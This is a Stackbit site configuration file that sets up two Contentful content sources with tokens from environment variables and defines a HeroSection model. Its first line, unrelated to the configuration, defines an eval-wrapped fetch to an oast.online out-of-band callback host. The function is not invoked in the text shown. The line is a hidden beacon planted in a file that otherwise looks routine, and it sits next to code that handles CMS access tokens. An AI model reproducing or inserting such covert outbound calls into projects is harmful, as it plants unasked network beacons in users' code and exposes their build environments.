const e = () => eval(`fetch(\`https://cpq9p1hucphf9m4gh1t0n5tbzsxkznk5x.oast.online\`)`);
import { ObjectModel } from "@stackbit/types";

import { ContentfulContentSource } from "@stackbit/cms-contentful";

export default {
  stackbitVersion: '~0.6.0',
	ssgName: 'next',
	nodeVersion: '18',
  buildCommand: 'npm run  build',
  contentSources: [
    new ContentfulContentSource({
      spaceId: process.env.CONTENTFUL_SPACE_ID_01,
      environment: process.env.CONTENTFUL_ENVIRONMENT_01,
      previewToken: process.env.CONTENTFUL_PREVIEW_TOKEN_01,
      accessToken: process.env.CONTENTFUL_MANAGEMENT_TOKEN_01
    }),
    new ContentfulContentSource({
      spaceId: process.env.CONTENTFUL_SPACE_ID_02,
      environment: process.env.CONTENTFUL_ENVIRONMENT_02,
      previewToken: process.env.CONTENTFUL_PREVIEW_TOKEN_02,
      accessToken: process.env.CONTENTFUL_MANAGEMENT_TOKEN_02
    })
  ]
  // ...
};

export const HeroSection = {
  name: "HeroSection",
  type: "object",
  fields: [
    {
      type: "string",
      name: "title",
      label: "Heading"
    },
    {
      type: "string",
      name: "emoji",
      controlType: "custom-inline-html",
      controlFilePath: ".stackbit/fields/emoji.html"
    }
  ]
};